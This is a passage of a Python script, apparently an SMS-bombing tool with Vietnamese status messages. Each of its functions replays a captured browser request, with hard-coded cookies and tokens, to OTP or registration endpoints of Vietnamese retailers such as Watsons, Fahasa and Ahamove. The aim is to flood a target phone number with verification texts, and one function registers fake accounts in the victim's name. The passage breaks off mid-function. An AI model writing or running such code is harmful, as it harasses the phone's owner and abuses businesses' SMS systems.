        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    params = {
        'ajax': 'true',
    }

    data = {
        'cellularPhone': sdt,
    }

    try:
        response = requests.post(
            'https://www.kiehls.com.vn/on/demandware.store/Sites-kiehls-vn-ng-Site/vi_VN/SMSVerification-SendSMS',
            params=params,
            cookies=cookies,
            headers=headers,
            data=data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("KIEHLS | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("KIEHLS | TRẠNG THÁI : THẤT BẠI")

def emart():
    cookies = {
        'emartsess': 'hk4hc7j1mnphvk2tg5dld4j0d3',
        'default': 'c4aca4bbfc3fc4949e4f881ec7',
        'language': 'vietn',
        'currency': 'VND',
    }

    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': 'emartsess=hk4hc7j1mnphvk2tg5dld4j0d3; default=c4aca4bbfc3fc4949e4f881ec7; language=vietn; currency=VND',
        'Origin': 'https://emartmall.com.vn',
        'Referer': 'https://emartmall.com.vn/index.php?route=account/register',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'mobile': sdt,
    }

    try:
        response = requests.post(
            'https://emartmall.com.vn/index.php?route=account/register/smsRegister',
            cookies=cookies,
            headers=headers,
            data=data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("EMART | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("EMART | TRẠNG THÁI : THẤT BẠI")

def watsons():
    cookies = {
        'dtCookie': 'v_4_srv_36_sn_78389D143AE67D0166F10A549E950094_perc_100000_ol_0_mul_1_app-3Aa156527b274862dd_0',
        'PIM-SESSION-ID': 'KeLTcCvBcFaAM7Ks',
        'ROUTE': '.api-6df67c4656-d6j6p',
        'AKA_A2': 'A',
        'ak_bmsc': 'E31AE1DCC8A5D8FB8538C991DE43DD4C~000000000000000000000000000000~YAAQyb0oFxTKab6QAQAAjFCE2Rjt8BLAhfR7mZCaJ7IABI/6nBYaj36Db0p6ZJDzG4KhkHXFPqZ+TnrJxNPp4QtxpGiNRy9IKWXIvkcbRaERswfeqZes6xN9l1tyZ9tnVqvGNxY6fWmj7bJ/wAqBmbn5nkthNqsOV248fyk0H2mnRw3a0cIWX4LNQFoPCYLwev0IjF5zAUaqdt9br3QIWk13QlTGmHkD9Zg0fcm17eh9ZiovLu+OxNX8+qm0WFfJ42UiWcntVhKCgAyle7Bt5+/YeKGSZBPvEWp8Z7pHm74JBvOjVnNUyQhHiu1G5MLaQ562LdPZQ6HlBlzKpXQz8hljtJGmaqO1ZQub5Uw8krLkElS252p4dArEACm3NIKvFiR5FgcGCk0UXFX0',
        'authorization': 'eIoVNH5XuB4bIiORjaaVO1iXwSU',
        'token_type': 'guest',
        'bm_mi': 'E2BE16B4175E923DABE3D82FBFF24664~YAAQyb0oF2Hjab6QAQAAN3uE2RgWjYGGJ8/uZoZObQVn1GO7IzJvpNTQqMJ33/xmfZhwdecFR3pZIrqQ6/hKiWsQcf7lkJBbLSAvwZ5XospWLtNcpsq58b1aBEPEL5VTicWc2Y0B27B1ehuBPTQaLBtz57IBvCiU7dImV33WirAOpq4wzpdHplX/ORU+ZvS1VveWGSDeWdBKyLi33cNInyM4lk0BXQT/Rd1cmhefuU2PK3D7S+oM86KiB6FUpnhaMH8du102SXZzAmELLItlAaR79Pgq7oX1pMjlC13gtNSSrd+88JTPT5HcK6fLuABMoK6/gRu6ZyMw~1',
        '_abck': '2EF1DA00357C893E967384BA03295C65~0~YAAQ31JNGxgxINmQAQAAGrmE2QzWa3gzvT6muyPn3xQyG66nWtsjmmz56fF161mJuOXOni/D1IiTzKVDPx6j58OfS7doDfha8HL37VbG5Xd3sTBiEQCOqO6qKdCPM+ldNYZQXfS06JbrCDjT5tmBX4MQAJ19emvH+u5757kK+WeNDROEKhmsqW/D/3jV3YI2perZITclDJxuuzEJKb33DGcc2EqLjRX7zzenCx0PyHUo60WvrR68rbo1hmzXy7o88P/wPBtfhKE2g2XHW7jaLDw3vpZvC2pg+QDS8MQMctG+JDbn6O/mi73YWqg3mBUonKzDs9k970iXZOsGSMYfzjrJM6Pkt8A5tW1a79TmH7c+FeprSaQb5SFDGtynUy0oM26QSNLFnamCcUdtQWnGtalq5WOA2MwEfVo7uL0vWaSNG4wr43FS+v4v/P4ylpx4o10TDcWCVVQJnzphjyhwxCR9i2b8WmbKKis8WH7tls3JspZbrRwbOg==~-1~-1~-1',
        'bm_sv': '65A51408418F3652B39E8481B85F70F3~YAAQ31JNGxkxINmQAQAAGrmE2RgTmiy1bNYdgQ4OjVlKLE7jmNL2DWFFfLF2mhgB1U2RGfPziEY3IYs2fKuknLfWZPEGvEZbSCKaqtoDgeT8Olk4p8YddYovOJ4S91mchuMPD2c0uOCKPLsMyc1SN2/ailEI+zLIn+S38H01hI+cTm30BM0ut7i1ueHR6SPFi9KpgZShseXoIn26/jAj4F6axZaLc3wLA5GQaEBcRsUGBbxTtA1aeMKtY9sIKl475w==~1',
        'bm_sz': '38994E99080E4985C36D7F989AEB7C92~YAAQ31JNGxoxINmQAQAAG7mE2RidSEMD/NtmBF9EO4NMTjX7d4awNQFjWTKEMuyzzi2BeaemzAuTOhgMAIPbOQiEjHfkN4C7S/z8uy4EfOdlRUNrny86trif+7fc9EtWIhmmJAbXv0+wOTXn8nVwgtKLWdtF2phFNfOkHtCEp5vT1fPcy48wj0LvXUrQk79lHolDtz/RHK1AiYu7k6an3/Kr21zMiK3+73jr43XGIPF9PZkWyvGREnG2fwYSQfb5b2l+NxMxVnANG/vVzOhBhHvYKE03/eGUgbIbM6OGzkeWovx284X0BrUXkKGzaWXpxTg69k/y+Enu0t+cyEkDZf8EjnJL7yRPk7RDPJ1LM75CjY+scUUVkrs7dqe10RIdC5l2R9lcDSZ7CzQXMbMirxuPfC96MS+E2doINPeHBIZUFyZCWnaKYRHzRB6uxQ==~4277571~3687480',
    }

    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'authorization': 'bearer eIoVNH5XuB4bIiORjaaVO1iXwSU',
        'cache-control': 'no-cache, no-store, must-revalidate, post-check=0, pre-check=0',
        'content-type': 'application/json',
        # 'cookie': 'dtCookie=v_4_srv_36_sn_78389D143AE67D0166F10A549E950094_perc_100000_ol_0_mul_1_app-3Aa156527b274862dd_0; PIM-SESSION-ID=KeLTcCvBcFaAM7Ks; ROUTE=.api-6df67c4656-d6j6p; AKA_A2=A; ak_bmsc=E31AE1DCC8A5D8FB8538C991DE43DD4C~000000000000000000000000000000~YAAQyb0oFxTKab6QAQAAjFCE2Rjt8BLAhfR7mZCaJ7IABI/6nBYaj36Db0p6ZJDzG4KhkHXFPqZ+TnrJxNPp4QtxpGiNRy9IKWXIvkcbRaERswfeqZes6xN9l1tyZ9tnVqvGNxY6fWmj7bJ/wAqBmbn5nkthNqsOV248fyk0H2mnRw3a0cIWX4LNQFoPCYLwev0IjF5zAUaqdt9br3QIWk13QlTGmHkD9Zg0fcm17eh9ZiovLu+OxNX8+qm0WFfJ42UiWcntVhKCgAyle7Bt5+/YeKGSZBPvEWp8Z7pHm74JBvOjVnNUyQhHiu1G5MLaQ562LdPZQ6HlBlzKpXQz8hljtJGmaqO1ZQub5Uw8krLkElS252p4dArEACm3NIKvFiR5FgcGCk0UXFX0; authorization=eIoVNH5XuB4bIiORjaaVO1iXwSU; token_type=guest; bm_mi=E2BE16B4175E923DABE3D82FBFF24664~YAAQyb0oF2Hjab6QAQAAN3uE2RgWjYGGJ8/uZoZObQVn1GO7IzJvpNTQqMJ33/xmfZhwdecFR3pZIrqQ6/hKiWsQcf7lkJBbLSAvwZ5XospWLtNcpsq58b1aBEPEL5VTicWc2Y0B27B1ehuBPTQaLBtz57IBvCiU7dImV33WirAOpq4wzpdHplX/ORU+ZvS1VveWGSDeWdBKyLi33cNInyM4lk0BXQT/Rd1cmhefuU2PK3D7S+oM86KiB6FUpnhaMH8du102SXZzAmELLItlAaR79Pgq7oX1pMjlC13gtNSSrd+88JTPT5HcK6fLuABMoK6/gRu6ZyMw~1; _abck=2EF1DA00357C893E967384BA03295C65~0~YAAQ31JNGxgxINmQAQAAGrmE2QzWa3gzvT6muyPn3xQyG66nWtsjmmz56fF161mJuOXOni/D1IiTzKVDPx6j58OfS7doDfha8HL37VbG5Xd3sTBiEQCOqO6qKdCPM+ldNYZQXfS06JbrCDjT5tmBX4MQAJ19emvH+u5757kK+WeNDROEKhmsqW/D/3jV3YI2perZITclDJxuuzEJKb33DGcc2EqLjRX7zzenCx0PyHUo60WvrR68rbo1hmzXy7o88P/wPBtfhKE2g2XHW7jaLDw3vpZvC2pg+QDS8MQMctG+JDbn6O/mi73YWqg3mBUonKzDs9k970iXZOsGSMYfzjrJM6Pkt8A5tW1a79TmH7c+FeprSaQb5SFDGtynUy0oM26QSNLFnamCcUdtQWnGtalq5WOA2MwEfVo7uL0vWaSNG4wr43FS+v4v/P4ylpx4o10TDcWCVVQJnzphjyhwxCR9i2b8WmbKKis8WH7tls3JspZbrRwbOg==~-1~-1~-1; bm_sv=65A51408418F3652B39E8481B85F70F3~YAAQ31JNGxkxINmQAQAAGrmE2RgTmiy1bNYdgQ4OjVlKLE7jmNL2DWFFfLF2mhgB1U2RGfPziEY3IYs2fKuknLfWZPEGvEZbSCKaqtoDgeT8Olk4p8YddYovOJ4S91mchuMPD2c0uOCKPLsMyc1SN2/ailEI+zLIn+S38H01hI+cTm30BM0ut7i1ueHR6SPFi9KpgZShseXoIn26/jAj4F6axZaLc3wLA5GQaEBcRsUGBbxTtA1aeMKtY9sIKl475w==~1; bm_sz=38994E99080E4985C36D7F989AEB7C92~YAAQ31JNGxoxINmQAQAAG7mE2RidSEMD/NtmBF9EO4NMTjX7d4awNQFjWTKEMuyzzi2BeaemzAuTOhgMAIPbOQiEjHfkN4C7S/z8uy4EfOdlRUNrny86trif+7fc9EtWIhmmJAbXv0+wOTXn8nVwgtKLWdtF2phFNfOkHtCEp5vT1fPcy48wj0LvXUrQk79lHolDtz/RHK1AiYu7k6an3/Kr21zMiK3+73jr43XGIPF9PZkWyvGREnG2fwYSQfb5b2l+NxMxVnANG/vVzOhBhHvYKE03/eGUgbIbM6OGzkeWovx284X0BrUXkKGzaWXpxTg69k/y+Enu0t+cyEkDZf8EjnJL7yRPk7RDPJ1LM75CjY+scUUVkrs7dqe10RIdC5l2R9lcDSZ7CzQXMbMirxuPfC96MS+E2doINPeHBIZUFyZCWnaKYRHzRB6uxQ==~4277571~3687480',
        'expires': '0',
        'if-modified-since': 'Mon, 22 Jul 2024 08:17:50 GMT',
        'origin': 'https://www.watsons.vn',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'queue-target': 'https://www.watsons.vn/vi/register',
        'queueit-target': 'https://www.watsons.vn/vi/register',
        'referer': 'https://www.watsons.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'vary': '*',
    }

    params = {
        'formId': 'registrationOTPForm_Web3',
        'lang': 'vi',
        'curr': 'VND',
    }

    json_data = {
        'uid': '',
        'action': 'REGISTRATION',
        'countryCode': '84',
        'target': sdt,
        'type': 'SMS',
    }

    try:
        response = requests.post(
            'https://api.watsons.vn/api/v2/wtcvn/otpToken',
            params=params,
            cookies=cookies,
            headers=headers,
            json=json_data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("WATSONS | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("WATSONS | TRẠNG THÁI : THẤT BẠI")

def hanoia():
    cookies = {
        'PHPSESSID': 'ah759kbp93umoqr5180jcbf75c',
        'form_key': 'dlinj8ESlS5lQx06',
        'form_key': 'dlinj8ESlS5lQx06',
        'mage-cache-storage': '%7B%7D',
        'mage-cache-storage-section-invalidation': '%7B%7D',
        'mage-cache-sessid': 'true',
        'recently_viewed_product': '%7B%7D',
        'recently_viewed_product_previous': '%7B%7D',
        'recently_compared_product': '%7B%7D',
        'recently_compared_product_previous': '%7B%7D',
        'product_data_storage': '%7B%7D',
        'mage-messages': '',
        'private_content_version': '88ede4a3f3efc946fd38132bc5254912',
        'section_data_ids': '%7B%7D',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'PHPSESSID=ah759kbp93umoqr5180jcbf75c; form_key=dlinj8ESlS5lQx06; form_key=dlinj8ESlS5lQx06; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; mage-messages=; private_content_version=88ede4a3f3efc946fd38132bc5254912; section_data_ids=%7B%7D',
        'origin': 'https://hanoia.com',
        'priority': 'u=1, i',
        'referer': 'https://hanoia.com/customer/account/create/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'number_phone': sdt,
        'form_key': 'dlinj8ESlS5lQx06',
        'currentUrl': 'https://hanoia.com/customer/account/create/',
    }

    try:
        response = requests.post('https://hanoia.com/smsmarketing/customer/sendOTP', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("HANOIA | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("HANOIA | TRẠNG THÁI : THẤT BẠI")

def ahamove():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json;charset=UTF-8',
        'origin': 'https://app.ahamove.com',
        'priority': 'u=1, i',
        'referer': 'https://app.ahamove.com/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'mobile': sdt,
        'country_code': 'VN',
        'firebase_sms_auth': True,
    }

    try:
        response = requests.post('https://api.ahamove.com/api/v3/public/user/login', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("AHAMOVE | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("AHAMOVE | TRẠNG THÁI : THẤT BẠI")

def fahasa():
    cookies = {
        'frontend': '2f118fe3b8c748c78199208b10b3f9cb',
        'utm_source': 'chin',
        'click_id': '8vTZ22kVeRZoISe',
        'utm_medium': 'chin',
        'utm_campaign': 'chin',
        'utm_term': 'chin',
        'utm_content': 'chin',
        'frontend_cid': 'uqAGx0CC6GhLtoUa',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'frontend=2f118fe3b8c748c78199208b10b3f9cb; utm_source=chin; click_id=8vTZ22kVeRZoISe; utm_medium=chin; utm_campaign=chin; utm_term=chin; utm_content=chin; frontend_cid=uqAGx0CC6GhLtoUa',
        'origin': 'https://www.fahasa.com',
        'priority': 'u=1, i',
        'referer': 'https://www.fahasa.com/?ref=chin&utm_source=chin&utm_medium=chin&utm_campaign=chin&utm_term=chin&utm_content=chin&click_id=8vTZ22kVeRZoISe',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phone': sdt,
    }

    try:
        response = requests.post('https://www.fahasa.com/ajaxlogin/ajax/checkPhone', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("FAHASA | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("FAHASA | TRẠNG THÁI : THẤT BẠI") 

def vascara():
    cookies = {
        'SHASH': 'ijiugnnbjqt1sravu0ag6dpvhn',
        'ctk': 'a98dd75f4edd2233308533430aebf26fcf6d1791d43bd503f95fd2b8f3f9bd3c',
        'fwlc': 'MQ%3D%3D',
        '_t': 'ijiugnnbjqt1sravu0ag6dpvhn',
        'ctiic': 'MA%3D%3D',
        'cokilocationcode': 'dm4%3D',
    }

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        # 'cookie': 'SHASH=ijiugnnbjqt1sravu0ag6dpvhn; ctk=a98dd75f4edd2233308533430aebf26fcf6d1791d43bd503f95fd2b8f3f9bd3c; fwlc=MQ%3D%3D; _t=ijiugnnbjqt1sravu0ag6dpvhn; ctiic=MA%3D%3D; cokilocationcode=dm4%3D',
        'origin': 'https://www.vascara.com',
        'priority': 'u=0, i',
        'referer': 'https://www.vascara.com/register/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    data = {
        'token': '6c6cf6eeb0482f868c3f921b12bf01ef4b1baef6',
        'fphone': sdt,
        'ffullname': 'nguyen thi huyen',
        'fpassword': '123123aA@',
        'fagree': '1',
        'fsubmit': '1',
    }

    try:
        response = requests.post('https://www.vascara.com/register/', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("VASCARA | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("VASCARA | TRẠNG THÁI : THẤT BẠI")

def sablanca():
    cookies = {
        'ASP.NET_SessionId': '1psn00n0dg1cj303ia2pi32e',
    }

    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': 'ASP.NET_SessionId=1psn00n0dg1cj303ia2pi32e',
        'Origin': 'https://sablanca.vn',
        'Referer': 'https://sablanca.vn/dang-ky',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'numberphone': sdt,
        'utm_source': 'Register',
    }

    try:
        response = requests.post('https://sablanca.vn/User/CheckCustomerPhoneIsCreateV21', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("SABLANCA | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("SABLANCA | TRẠNG THÁI : THẤT BẠI")

def sandro():
    cookies = {
        'PHPSESSID': 'e4dm9dd73g7s1p5s8a0408osmu',
        'form_key': 'MVfTxS24jyAJkIgf',
        'form_key': 'MVfTxS24jyAJkIgf',
        'category_first': '3',
        'mage-cache-storage': '%7B%7D',
        'mage-cache-storage-section-invalidation': '%7B%7D',
        'mage-cache-sessid': 'true',
        'recently_viewed_product': '%7B%7D',
        'recently_viewed_product_previous': '%7B%7D',
        'recently_compared_product': '%7B%7D',
        'recently_compared_product_previous': '%7B%7D',
        'product_data_storage': '%7B%7D',
        'mage-messages': '',
        'mgn_menu_category_1': '21',
        'private_content_version': '4fa1b90d7f995085e3ce9442f6fa924a',
        'section_data_ids': '%7B%7D',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'PHPSESSID=e4dm9dd73g7s1p5s8a0408osmu; form_key=MVfTxS24jyAJkIgf; form_key=MVfTxS24jyAJkIgf; category_first=3; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; mage-messages=; mgn_menu_category_1=21; private_content_version=4fa1b90d7f995085e3ce9442f6fa924a; section_data_ids=%7B%7D',
        'origin': 'https://sandro.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://sandro.com.vn/customer/account/create/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'number_phone': sdt,
        'form_key': 'MVfTxS24jyAJkIgf',
        'currentUrl': 'https://sandro.com.vn/customer/account/create/',
    }

    try:
        response = requests.post('https://sandro.com.vn/smsmarketing/customer/sendOTP', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("SANDRO | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("SANDRO | TRẠNG THÁI : THẤT BẠI")

def routine():
    cookies = {
        'wp_ga4_customerGroup': 'NOT%20LOGGED%20IN',
        'X-Magento-Vary': '7ad851671356eb8fbf873fbdb216dde0a2e0c003',
        'PHPSESSID': 'j54mg8mlaj1fe1tpa8n7lig4g1',
        'mage-cache-storage': '%7B%7D',
        'mage-cache-storage-section-invalidation': '%7B%7D',
        'mage-cache-sessid': 'true',
        'recently_viewed_product': '%7B%7D',
        'recently_viewed_product_previous': '%7B%7D',
        'recently_compared_product': '%7B%7D',
        'recently_compared_product_previous': '%7B%7D',
        'product_data_storage': '%7B%7D',
        'mage-messages': '',
        'form_key': 'JUHbfiSaEBTLQRud',
        'private_content_version': '7f7eeb6ab1ef8a3d8536cfcfa413ff07',
        'section_data_ids': '%7B%22customer%22%3A1721578592%2C%22compare-products%22%3A1721578592%2C%22last-ordered-items%22%3A1721578592%2C%22cart%22%3A1721644002%2C%22directory-data%22%3A1721578592%2C%22captcha%22%3A1721578592%2C%22instant-purchase%22%3A1721578592%2C%22loggedAsCustomer%22%3A1721578592%2C%22persistent%22%3A1721644002%2C%22review%22%3A1721578592%2C%22wishlist%22%3A1721578592%2C%22ammessages%22%3A1721578592%2C%22chatData%22%3A1721578592%2C%22guest_wishlist%22%3A1721578592%2C%22magenest-fbpixel-atc%22%3A1721578592%2C%22magenest-fbpixel-subscribe%22%3A1721578592%2C%22google-tag-manager-product-info%22%3A1721578592%2C%22wp_ga4%22%3A1721578592%2C%22recently_viewed_product%22%3A1721578592%2C%22recently_compared_product%22%3A1721578592%2C%22product_data_storage%22%3A1721578592%2C%22paypal-billing-agreement%22%3A1721578592%2C%22messages%22%3A1721644002%7D',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'wp_ga4_customerGroup=NOT%20LOGGED%20IN; X-Magento-Vary=7ad851671356eb8fbf873fbdb216dde0a2e0c003; PHPSESSID=j54mg8mlaj1fe1tpa8n7lig4g1; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; mage-messages=; form_key=JUHbfiSaEBTLQRud; private_content_version=7f7eeb6ab1ef8a3d8536cfcfa413ff07; section_data_ids=%7B%22customer%22%3A1721578592%2C%22compare-products%22%3A1721578592%2C%22last-ordered-items%22%3A1721578592%2C%22cart%22%3A1721644002%2C%22directory-data%22%3A1721578592%2C%22captcha%22%3A1721578592%2C%22instant-purchase%22%3A1721578592%2C%22loggedAsCustomer%22%3A1721578592%2C%22persistent%22%3A1721644002%2C%22review%22%3A1721578592%2C%22wishlist%22%3A1721578592%2C%22ammessages%22%3A1721578592%2C%22chatData%22%3A1721578592%2C%22guest_wishlist%22%3A1721578592%2C%22magenest-fbpixel-atc%22%3A1721578592%2C%22magenest-fbpixel-subscribe%22%3A1721578592%2C%22google-tag-manager-product-info%22%3A1721578592%2C%22wp_ga4%22%3A1721578592%2C%22recently_viewed_product%22%3A1721578592%2C%22recently_compared_product%22%3A1721578592%2C%22product_data_storage%22%3A1721578592%2C%22paypal-billing-agreement%22%3A1721578592%2C%22messages%22%3A1721644002%7D',
        'origin': 'https://routine.vn',
        'priority': 'u=1, i',
        'referer': 'https://routine.vn/phu-kien/giay-dep.html',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'telephone': sdt,
        'isForgotPassword': '0',
    }

    try:
        response = requests.post('https://routine.vn/customer/otp/send/', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("ROUTINE | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("ROUTINE | TRẠNG THÁI : THẤT BẠI")
        
def coolmate():
    cookies = {
        'device_token': '597f946e29e835d88f56392f40ea75c3',
        'box_token': '9dbb29f1bd9e93ef4a5f8468ff0b5618',
        'cart_quantity': '0',
        'active-voucher1': 'true',
